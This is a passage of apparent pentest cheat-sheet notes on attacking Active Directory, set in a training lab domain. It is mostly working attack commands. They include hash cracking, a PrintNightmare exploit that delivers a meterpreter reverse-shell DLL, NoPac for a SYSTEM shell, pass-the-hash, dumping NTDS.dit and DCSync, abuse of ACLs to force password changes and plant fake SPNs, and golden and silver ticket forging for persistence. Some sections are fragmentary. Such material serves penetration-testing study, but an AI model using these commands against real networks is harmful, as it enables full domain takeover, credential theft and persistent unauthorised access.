Checking with PowerView, we can see that the msDS-SupportedEncryptionTypes attribute is set to 0. The chart here[https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797] tells us that a decimal value of 0 means that a specific encryption type is not defined and set to the default of RC4_HMAC_MD5.

###### Cracking the Ticket with Hashcat & rockyou.txt
```
$ hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt 
```

If we check this with PowerView, we'll see that the msDS-SupportedEncryptionTypes attribute is set to 24, meaning that AES 128/256 encryption types are the only ones supported.


###### Running Hashcat
```
$ hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 
```

###### Using the /tgtdeleg Flag
We can use Rubeus with the /tgtdeleg flag to specify that we want only RC4 encryption when requesting a new service ticket. The tool does this by specifying RC4 encryption as the only algorithm we support in the body of the TGS request. This may be a failsafe built-in to Active Directory for backward compatibility. By using this flag, we can request an RC4 (type 23) encrypted ticket that can be cracked much faster.

`Note: This does not work against a Windows Server 2019 Domain Controller, regardless of the domain functional level. It will always return a service ticket encrypted with the highest level of encryption supported by the target account. This being said, if we find ourselves in a domain with Domain Controllers running on Server 2016 or earlier (which is quite common), enabling AES will not partially mitigate Kerberoasting by only returning AES encrypted tickets, which are much more difficult to crack, but rather will allow an attacker to request an RC4 encrypted service ticket. In Windows Server 2019 DCs, enabling AES encryption on an SPN account will result in us receiving an AES-256 (type 18) service ticket, which is substantially more difficult (but not impossible) to crack, especially if a relatively weak dictionary password is in use.`

* * *

## Vulnerabilities
### PrintNightmare
PrintNightmare is the nickname given to two vulnerabilities (CVE-2021-34527 and CVE-2021-1675) found in the Print Spooler service that runs on all Windows operating systems. Many exploits have been written based on these vulnerabilities that allow for privilege escalation and remote code execution. Using this vulnerability for local privilege escalation is covered in the Windows Privilege Escalation module, but is also important to practice within the context of Active Directory environments for gaining remote access to a host. Let's practice with one exploit that can allow us to gain a SYSTEM shell session on a Domain Controller running on a Windows Server 2019 host.

We can use rpcdump.py to see if Print System Asynchronous Protocol and Print System Remote Protocol are exposed on the target.


#### Enumerating for MS-RPRN
```bash
$ rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
```

#### Generating a DLL Payload
```bash
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll

$ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll

use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp

$ sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
```

### NoPac (SamAccountName Spoofing)
This exploit path takes advantage of being able to change the SamAccountName of a computer account to that of a Domain Controller. By default, authenticated users can add up to ten computers to a domain. When doing so, we change the name of the new host to match a Domain Controller's SamAccountName. Once done, we must request Kerberos tickets causing the service to issue us tickets under the DC's name instead of the new name. When a TGS is requested, it will issue the ticket with the closest matching name. Once done, we will have access as that service and can even be provided with a SYSTEM shell on a Domain Controller.

NoPac [https://github.com/Ridter/noPac] uses many tools in Impacket to communicate with, upload a payload, and issue commands from the attack host to the target DC. Before attempting to use the exploit, we should ensure Impacket is installed and the noPac [] exploit repo is cloned to our attack host if needed. We can use these commands to do so:


we can use the scripts in the NoPac directory to check if the system is vulnerable using a scanner (scanner.py) then use the exploit (noPac.py) to gain a shell as NT AUTHORITY/SYSTEM. We can use the scanner with a standard domain user account to attempt to obtain a TGT from the target Domain Controller. If successful, this indicates the system is, in fact, vulnerable. We'll also notice the ms-DS-MachineAccountQuota number is set to 10. In some environments, an astute sysadmin may set the ms-DS-MachineAccountQuota value to 0. If this is the case, the attack will fail because our user will not have the rights to add a new machine account. Setting this to 0 can prevent quite a few AD attacks.

```bash
# Scanning for NoPac
$ sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap

# Running NoPac & Getting a Shell
$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```
It is important to note that NoPac.py does save the TGT in the directory on the attack host where the exploit was run. We can use ls to confirm.

#### Using noPac to DCSync the Built-in Administrator Account
```bash
$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```

### Printer Bug
The Printer Bug is a flaw in the MS-RPRN protocol (Print System Remote Protocol). This protocol defines the communication of print job processing and print system management between a client and a print server. To leverage this flaw, any domain user can connect to the spool's named pipe with the RpcOpenPrinter method and use the RpcRemoteFindFirstPrinterChangeNotificationEx method, and force the server to authenticate to any host provided by the client over SMB.

The spooler service runs as SYSTEM and is installed by default in Windows servers running Desktop Experience. This attack can be leveraged to relay to LDAP and grant your attacker account DCSync privileges to retrieve all password hashes from AD.

The attack can also be used to relay LDAP authentication and grant Resource-Based Constrained Delegation (RBCD) privileges for the victim to a computer account under our control, thus giving the attacker privileges to authenticate as any user on the victim's computer. This attack can be leveraged to compromise a Domain Controller in a partner domain/forest, provided you have administrative access to a Domain Controller in the first forest/domain already, and the trust allows TGT delegation, which is not by default anymore.

We can use tools such as the Get-SpoolStatus module from this tool or [https://github.com/NotMedic/NetNTLMtoSilverTicket] this tool to check for machines vulnerable to the MS-PRN Printer Bug. This flaw can be used to compromise a host in another forest that has Unconstrained Delegation enabled, such as a domain controller. It can help us to attack across forest trusts once we have compromised one forest.

### PrivExchange
The PrivExchange attack results from a flaw in the Exchange Server PushSubscription feature, which allows any domain user with a mailbox to force the Exchange server to authenticate to any host provided by the client over HTTP.

The Exchange service runs as SYSTEM and is over-privileged by default (i.e., has WriteDacl privileges on the domain pre-2019 Cumulative Update). This flaw can be leveraged to relay to LDAP and dump the domain NTDS database. If we cannot relay to LDAP, this can be leveraged to relay and authenticate to other hosts within the domain. This attack will take you directly to Domain Admin with any authenticated domain user account.

### Password in Description Field
Sensitive information such as account passwords are sometimes found in the user account Description or Notes fields and can be quickly enumerated using PowerView. For large domains, it is helpful to export this data to a CSV file to review offline.

#### Finding Passwords in the Description Field using Get-Domain User
```
PS > Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
```

### PASSWD_NOTREQD Field
It is possible to come across domain accounts with the passwd_notreqd field set in the userAccountControl attribute. If this is set, the user is not subject to the current password policy length, meaning they could have a shorter password or no password at all (if empty passwords are allowed in the domain). A password may be set as blank intentionally (sometimes admins don’t want to be called out of hours to reset user passwords) or accidentally hitting enter before entering a password when changing it via the command line. Just because this flag is set on an account, it doesn't mean that no password is set, just that one may not be required. There are many reasons why this flag may be set on a user account, one being that a vendor product set this flag on certain accounts at the time of installation and never removed the flag post-install. It is worth enumerating accounts with this flag set and testing each to see if no password is required (I have seen this a couple of times on assessments). Also, include it in the client report if the goal of the assessment is to be as comprehensive as possible.

#### Checking for PASSWD_NOTREQD Setting using Get-DomainUser
```
PS > Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

* * *

# Lateral Movement
## Credentials/ Pass The Hash
### Validating the Credentials
{ldap,mssql,smb,ssh,winrm}
```bash
$ crackmapexec <protocol> <ip_range> -u <user> -p <password> -d <domain>
$ crackmapexec <protocol> <ip_range> -u <user> -H <hash> -d <domain>

$ crackmapexec <protocol> <ip_range> -u <user> -p <password> --local-auth
```

### Mimikatz
```
> kerberos::hash /password:lucky7

> mimikatz.exe
# privilege::debug 
# sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:"cmd.exe" exit
```

### [SMB](../Services/SMB.md#remote-code-execution)

### [WinRM](../Services/WINRM.md#connecting)
**Enumerating the Remote Management Users Group**
```powershell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
```

**Using the Cypher Query in BloodHound**
```powershell
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

### [RDP](../Services/RDP.md#connecting)
**Enumerating the Remote Desktop Users Group**
```
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
```

**Checking the Domain Users Group's Local Admin & Execution Rights using BloodHound**
If we gain control over a user through an attack such as LLMNR/NBT-NS Response Spoofing or Kerberoasting, we can search for the username in BloodHound to check what type of remote access rights they have either directly or inherited via group membership under Execution Rights on the Node Info tab.

We could also check the Analysis tab and run the pre-built queries Find Workstations where Domain Users can RDP or Find Servers where Domain Users can RDP

### [MSSQL](../Services/SQL.md#mssql)
More often than not, we will encounter SQL servers in the environments we face. It is common to find user and service accounts set up with sysadmin privileges on a given SQL server instance. We may obtain credentials for an account with this access via Kerberoasting (common) or others such as LLMNR/NBT-NS Response Spoofing or password spraying. Another way that you may find SQL server credentials is using the tool Snaffler to find web.config or other types of configuration files that contain SQL server connection strings.

BloodHound, once again, is a great bet for finding this type of access via the SQLAdmin edge. We can check for SQL Admin Rights in the Node Info tab for a given user or use this custom Cypher query to search:

**Using a Custom Cypher Query to Check for SQL Admin Rights in BloodHound**
```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

**Enumerating MSSQL Instances with PowerUpSQL**
```powershell
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain

Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```

We could then choose enable_xp_cmdshell to enable the xp_cmdshell stored procedure which allows for one to execute operating system commands via the database if the account in question has the proper access rights.
[xp_cmdshell](../Services/SQL.md#xp_cmdshell) 

* * *

* * *


* * *

# Privilege Escalation
Check [Windows Privilege Escalation](../PrivilegeEscalation/Windows.md)
- [Vulnerabilities](../PrivilegeEscalation/Windows.md#vulnerabilities)
- [Credential Harvesting](../PrivilegeEscalation/Windows.md#credential-harvesting)

* * *

# Admin Access on Machine
Check [Windows Privilege Escalation](../PrivilegeEscalation/Windows.md)
- [Passwords Attacks](../PrivilegeEscalation/Windows.md#passwords-attacks)
- [Credential Harvesting](../PrivilegeEscalation/Windows.md#credential-harvesting)


## Dump NTDS.dit
In this section, we will focus primarily on how we can extract credentials through the use of a dictionary attack against AD accounts and dumping hashes from the NTDS.dit file.

Like many of the attacks we have covered thus far, our target must be reachable over the network. This means it is highly likely that we will need to have a foothold established on the internal network to which the target is connected. That said, there are situations where an organization may be using port forwarding to forward the remote desktop protocol (3389) or other protocols used for remote access on their edge router to a system on their internal network. Please know that most methods covered in this module simulate the steps after an initial compromise, and a foothold is established on an internal network. Before we get hands-on with the attack methods, let's consider the authentication process once a Windows system has been joined to the domain. This approach will help us better understand the significance of Active Directory and the password attacks it can be susceptible to.

Once a Windows system is joined to a domain, it will no longer default to referencing the SAM database to validate logon requests. That domain-joined system will now send all authentication requests to be validated by the domain controller before allowing a user to log on. This does not mean the SAM database can no longer be used. Someone looking to log on using a local account in the SAM database can still do so by specifying the hostname of the device proceeded by the Username (Example: WS01/nameofuser) or with direct access to the device then typing ./ at the logon UI in the Username field. This is worthy of consideration because we need to be mindful of what system components are impacted by the attacks we perform. It can also give us additional avenues of attack to consider when targeting Windows desktop operating systems or Windows server operating systems with direct physical access or over a network. Keep in mind that we can also study NTDS attacks by keeping track of this technique.

* * *

## Capturing NTDS.dit
NT Directory Services (NTDS) is the directory service used with AD to find & organize network resources. Recall that NTDS.dit file is stored at %systemroot%/ntds on the domain controllers in a forest. The .dit stands for directory information tree. This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information. If this file can be captured, we could potentially compromise every account on the domain similar to the technique we covered in this module's Attacking SAM section. As we practice this technique, consider the importance of protecting AD and brainstorm a few ways to stop this attack from happening.

We are looking to see if the account has local admin rights. To make a copy of the NTDS.dit file, we need local admin (Administrators group) or Domain Admin (Domain Admins group) (or equivalent) rights. We also will want to check what domain privileges we have.

### Checking User Account Privileges including Domain
```powershell
PS > net localgroup
PS > net user <user>
``` 

### Creating Shadow Copy of C:
We can use vssadmin to create a Volume Shadow Copy (VSS) of the C: drive or whatever volume the admin chose when initially installing AD. It is very likely that NTDS will be stored on C: as that is the default location selected at install, but it is possible to change the location. We use VSS for this because it is designed to make copies of volumes that may be read & written to actively without needing to bring a particular application or system down. VSS is used by many different backup & disaster recovery software to perform operations.

```powershell
PS > vssadmin CREATE SHADOW /For=C:
```

#### Copying NTDS.dit from the VSS
We can then copy the NTDS.dit file from the volume shadow copy of C: onto another location on the drive to prepare to move NTDS.dit to our attack host.

- `cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit`


### CrackMapExec
Alternatively, we may benefit from using CrackMapExec to accomplish the same steps shown above, all with one command. This command allows us to utilize VSS to quickly capture and dump the contents of the NTDS.dit file conveniently within our terminal session.
```bash
$ crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```

### Impacket
```bash
$ secretsdump.py <DOMAIN>/<USER>:<PASSWORD>@<IP> 
```

## Cracking Hashes & Gaining Credentials
Check [Brute Force](../BruteForce/BruteForce.md#hashcat)

* * *

# Permissions Move
## ACL Enumeration
Attackers utilize ACE entries to either further access or establish persistence. These can be great for us as penetration testers as many organizations are unaware of the ACEs applied to each object or the impact that these can have if applied incorrectly. They cannot be detected by vulnerability scanning tools, and often go unchecked for many years, especially in large and complex environments. During an assessment where the client has taken care of all of the "low hanging fruit" AD flaws/misconfigurations, ACL abuse can be a great way for us to move laterally/vertically and even achieve full domain compromise. Some example Active Directory object security permissions are as follows. These can be enumerated (and visualized) using a tool such as BloodHound, and are all abusable with PowerView, among other tools:

![alt text](https://academy.hackthebox.com/storage/modules/143/ACL_attacks_graphic.png)

ForceChangePassword abused with Set-DomainUserPassword
Add Members abused with Add-DomainGroupMember
GenericAll abused with Set-DomainUserPassword or Add-DomainGroupMember
GenericWrite abused with Set-DomainObject
WriteOwner abused with Set-DomainObjectOwner
WriteDACL abused with Add-DomainObjectACL
AllExtendedRights abused with Set-DomainUserPassword or Add-DomainGroupMember
Addself abused with Add-DomainGroupMember

### Enumerating ACLs with BloodHound
Next, we can set the Username user as our starting node, select the Node Info tab and scroll down to Outbound Control Rights

### Enumerating ACLs with PowerView
#### Using Find-InterestingDomainAcl
```powershell
PS > Find-InterestingDomainAcl
```

We can then use the Get-DomainObjectACL function to perform our targeted search. In the below example, we are using this function to find all domain objects that our user has rights over by mapping the user's SID using the $sid variable to the SecurityIdentifier property which is what tells us who has the given right over an object. One important thing to note is that if we search without the flag ResolveGUIDs, we will see results like the below, where the right ExtendedRight does not give us a clear picture of what ACE entry the user wley has over damundsen. This is because the ObjectAceType property is returning a GUID value that is not human readable.

Note that this command will take a while to run, especially in a large environment. It may take 1-2 minutes to get a result in our lab.

#### Using Get-DomainObjectACL
```powershell
PS > Import-Module .\PowerView.ps1
PS > $sid = Convert-NameToSid <USERNAME>
PS > Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

#### Performing a Reverse Search & Mapping to a GUID Value
```powershell
PS > $guid= "<ObjectAceType>"
PS > Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
```

#### Using the -ResolveGUIDs Flag
```powershell
PS > Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
```

#### Creating a List of Domain Users
```powershell
PS > Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
```

#### A Useful foreach Loop
```
PS > foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
```

#### Further Enumeration of Rights Using damundsen
```
PS > $sid2 = Convert-NameToSid damundsen
PS > Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
```

#### Investigating the Help Desk Level 1 Group with Get-DomainGroup
```
PS > Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
```

#### Investigating the Information Technology Group
```
PS > $itgroupsid = Convert-NameToSid "Information Technology"
PS > Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose
```

#### Looking for Interesting Access
```
PS > $adunnsid = Convert-NameToSid adunn 
PS > Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose
```

* * *

## ACL Abuse Tactics
```powershell
PS > Import-Module .\PowerView.ps1
```

### ForceChangePassword
So, first, we must authenticate as user1 because he can force change the password of the user user2. We can start by opening a PowerShell console and authenticating as the user1 user. Otherwise, we could skip this step if we were already running as this user. To do this, we can create a PSCredential object.

```powershell
# Creating a PSCredential Object
PS > $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
PS > $Cred = New-Object System.Management.Automation.PSCredential('<INLANEFREIGHT>\<user1>', $SecPassword) 

# Creating a SecureString Object**
PS > $user2Password = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

# Changing the User's Password
PS > Set-DomainUserPassword -Identity user2 -AccountPassword $user2Password -Credential $Cred -Verbose
```
We can see that the command completed successfully, changing the password for the target user while using the credentials we specified for the user1 that we control. 

### Add-DomainGroupMember
```powershell
# Creating a SecureString Object using user2
PS > $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
PS > $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\user', $SecPassword) 

# Adding user2 to the Help Desk Level 1 Group
PS > Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'user2' -Credential $Cred2 -Verbose
PS > Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members

# Confirming user2 was Added to the Group**
PS > Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
```

At this point, we should be able to leverage our new group membership to take control over the user3. Now, let's say that our client permitted us to change the password of the user2, but the user3 is an admin account that cannot be interrupted. Since we have GenericAll rights over this account, we can have even more fun and perform a targeted Kerberoasting attack by modifying the account's servicePrincipalName attribute to create a fake SPN that we can then Kerberoast to obtain the TGS ticket and (hopefully) crack the hash offline using Hashcat.

We must be authenticated as a member of the Information Technology group for this to be successful. Since we added damundsen to the Help Desk Level 1 group, we inherited rights via nested group membership. We can now use Set-DomainObject to create the fake SPN. We could use the tool targetedKerberoast [https://github.com/ShutdownRepo/targetedKerberoast] to perform this same attack from a Linux host, and it will create a temporary SPN, retrieve the hash, and delete the temporary SPN all in one command.

### Creating a Fake SPN
```powershell
PS > Set-DomainObject -Credential $Cred2 -Identity user3 -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

```bash
$ targetedKerberoast.py -d <domain> -u <user> -p <pass>
```

#### Kerberoasting with Rubeus
```
PS > .\Rubeus.exe kerberoast /user:user3 /nowrap
```

#### Cleanup
```powershell
# Removing the Fake SPN from user3's Account
PS > Set-DomainObject -Credential $Cred2 -Identity user3 -Clear serviceprincipalname -Verbose

# Removing user2 from the Help Desk Level 1 Group
PS > Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'user2' -Credential $Cred2 -Verbose

# Confirming user2 was Removed from the Group
PS > Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'user2'} -Verbose
```

* * *

## DCSync 
DCSync is a technique for stealing the Active Directory password database by using the built-in Directory Replication Service Remote Protocol, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.

The crux of the attack is requesting a Domain Controller to replicate passwords via the DS-Replication-Get-Changes-All extended right. This is an extended access control right within AD, which allows for the replication of secret data.

To perform this attack, you must have control over an account that has the rights to perform domain replication (a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set). Domain/Enterprise Admins and default domain administrators have this right by default.

### Using Get-DomainUser to View adunn's Group Membership
```
PS > Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
```

### Using Get-ObjectAcl to Check adunn's Replication Rights
```
PS > $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
PS > Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

### Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py
```bash
$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 

# NTLM authentication
$ secretsdump.py -outputfile inlanefreight_hashes <DOMAIN>/<USER>:<PASSWORD>@<DC_IP> 

# Hash authentication
$ secretsdump.py -outputfile inlanefreight_hashes -hash <DOMAIN>/<USER>@<DC_IP> 

# Kerberos authentication
$ secretsdump.py -outputfile inlanefreight_hashes -no-pass -k <DOMAIN>/<USER>@<DC_IP> 
```
We can use the -just-dc-ntlm flag if we only want NTLM hashes or specify -just-dc-user USERNAME to only extract data for a specific user. Other useful options include -pwd-last-set to see when each account's password was last changed and -history if we want to dump password history, which may be helpful for offline password cracking or as supplemental data on domain password strength metrics for our client. The -user-status is another helpful flag to check and see if a user is disabled. We can dump the NTDS data with this flag and then filter out disabled users when providing our client with password cracking statistics to ensure that data such as:

If we check the files created using the -just-dc flag, we will see that there are three: one containing the NTLM hashes, one containing Kerberos keys, and one that would contain cleartext passwords from the NTDS for any accounts set with reversible encryption enabled.

### Using runas.exe
```
> runas /netonly /user:INLANEFREIGHT\adunn powershell
```

### Performing the Attack with Mimikatz
```
PS > .\mimikatz.exe
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```

* * *

# Domain Admin
Check [Dump NTDS.dit](#dump-ntdsdit)

* * *

# Persistence
## GoldTicket 
- https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden 
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket

### Mimikatz
```powershell
# with an NT hash
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /rc4:$krbtgt_NThash /user:randomuser /ptt

# with an AES 128 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes128:$krbtgt_aes128_key /user:randomuser /ptt

# with an AES 256 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes256:$krbtgt_aes256_key /user:randomuser /ptt
```

### Rubeus
```
.\Rubeus.exe ptt /ticket:ticket.kirbi
```

### Remote
```
PS > import-module .\PowerView.ps1
PS > Get-DomainSID
```

```bash
# Create the golden ticket (with an RC4 key, i.e. NT hash)
$ ticketer.py -nthash $krbtgtNThash -domain-sid $domainSID -domain $DOMAIN randomuser

# Create the golden ticket (with an AES 128/256bits key)
$ ticketer.py -aesKey $krbtgtAESkey -domain-sid $domainSID -domain $DOMAIN randomuser

# Set the ticket for impacket use
$ export KRB5CCNAME=<TGS_ccache_file>
```

* * *

## SilverTicket
- https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket

The Silver Ticket attack involves the exploitation of service tickets in Active Directory (AD) environments. This method relies on acquiring the NTLM hash of a service account, such as a computer account, to forge a Ticket Granting Service (TGS) ticket. With this forged ticket, an attacker can access specific services on the network, impersonating any user, typically aiming for administrative privileges. It's emphasized that using AES keys for forging tickets is more secure and less detectable.

### Generate the RC4 hash from password
```
> mimikatz.exe
> kerberos::hash /password:MyPassword
```

### Mimikatz
```powershell
# To generate the TGS with NTLM
> kerberos::golden /domain:<domain_name> /sid:<domain_sid> /rc4:<ntlm_hash> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>

# To generate the TGS with AES 128 key
> kerberos::golden /domain:<domain_name> /sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>

# To generate the TGS with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)
> kerberos::golden /domain:<domain_name> /sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname> 

# Inject TGS with Mimikatz
> kerberos::ptt <ticket_kirbi_file>
```

### Rubeus
```
> .\Rubeus.exe ptt /ticket:<ticket_kirbi_file>
```

### Remote
```bash
$ ticketer.py -nthash $NTLM -domain-sid $DOMAIN_SID -domain $DOMAIN <USER>

# To generate the TGS with NTLM
$ python ticketer.py -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>

# To generate the TGS with AES key
$ python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>

# Set the ticket for impacket use
$ export KRB5CCNAME=<TGS_ccache_file>
```

